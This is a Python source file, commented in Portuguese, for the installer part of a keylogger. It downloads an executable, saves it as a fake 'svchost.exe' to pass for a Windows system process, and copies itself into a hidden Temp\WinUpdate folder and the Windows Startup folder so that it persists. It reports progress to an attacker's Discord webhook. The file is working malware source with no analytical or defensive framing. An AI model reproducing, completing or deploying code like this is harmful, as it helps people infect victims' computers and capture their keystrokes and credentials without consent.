import os
import sys
import shutil
import requests
from dotenv import load_dotenv
from funcoes import criar_canal, send, kill

load_dotenv()

url = os.getenv('webhook_url_logs')
guild_id = os.getenv('guild_id')
token_dc = os.getenv('token_dc')

FAKE_NAME = "svchost.exe"  # nome do executável falso

# Diretorios onde o KeyLogger vai se espalhar
DIRS = [
    os.path.join(os.getenv('LOCALAPPDATA'), r"Temp\WinUpdate"),
]

startup = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup")
inicializar = os.path.join(startup, FAKE_NAME)



# Função de criar Canal
criar_canal()

resposta = requests.get('COLOCAR URL DO EXECUTAVEL')
if resposta.status_code == 200:
    with open(FAKE_NAME, 'wb' ) as f:
        f.write(resposta.content)
    send(f'{FAKE_NAME} baixado')
else:
    send(f'Erro ao baixar {resposta.status_code}')

# Instala arquivo nos diretorios
def replicar_executavel():
    exe_path = sys.executable  # caminho do executável atual (.exe)
    for pasta in DIRS:
        try:
            os.makedirs(pasta, exist_ok=True)  # cria pasta se não existir
            destino = os.path.join(pasta, FAKE_NAME)
            if not os.path.exists(destino):
                shutil.copy2(exe_path, destino)  # copia o executável para a pasta
                shutil.copy2(exe_path, inicializar) # Copia o executavel para o Startup do Windows 
                send(f'Arquivo clonado em {destino}')
            else:
                print(f"Executável já existe em {destino}")
        except Exception as e:
            print(f"Erro ao copiar para {pasta}: {e}")


if __name__ == "__main__":
    replicar_executavel()

